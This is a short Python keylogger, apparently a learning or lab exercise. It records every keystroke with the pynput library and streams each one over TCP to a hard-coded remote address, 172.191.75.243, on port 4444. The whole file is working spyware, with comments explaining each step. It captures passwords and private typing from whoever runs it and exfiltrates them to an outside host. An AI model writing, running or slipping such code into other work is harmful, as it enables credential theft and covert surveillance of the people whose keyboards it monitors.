'''Import Pynput and Socket Libraries.
Pynput library is used to listen for input devices.
Socket library is used for creating network connections.'''
from pynput import keyboard
import socket

# IP Address and Port Number
ip_address = "172.191.75.243"
port_number = 4444

'''Creates a connection between to specified IPv4 address and port number.
   Sends error message if connection could not be established 
   '''
try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.AF_INET(Specifies IPv4, socket.SOCK_STREAM(Specifies TCP connection
    client.connect((ip_address, port_number)) #Connects to IP address and port number stored in variables above
    print(f"[+] Connected to {ip_address}:{port_number}") #Prints connection message if successful
    print("Listening for keystrokes...") #Prints confirmation message
except Exception as e:
    print("Connection failed:", e) #Prinst connection message if connection failed
    exit() #Exits terminal

'''Handles keystrokes to make output clearer to users. AttributeError converts 
non-specified special keys into a string if key.char does not exist'''

def on_press(key):
    try:
        if key == keyboard.Key.space:
            keydata = ' '
        elif key == keyboard.Key.ctrl_l:
            keydata = ' '
        elif key == keyboard.Key.ctrl_r:
            keydata = ' '
        elif key == keyboard.Key.tab:
            keydata = '\t'
        elif key == keyboard.Key.enter:
            keydata = ' '
        else:
            keydata = key.char
    except AttributeError:
        keydata = str(key)
    print(f"Key: {keydata}")

    '''Sends keydata to VM and converts string into bytes.'''
    try:
        client.send(keydata.encode())
    except Exception as e:
        print("Send error:", e)
        exit()
# Creates a listener to watch or "listen" for keystrokes.
with keyboard.Listener(on_press = on_press) as listener:
    listener.join()

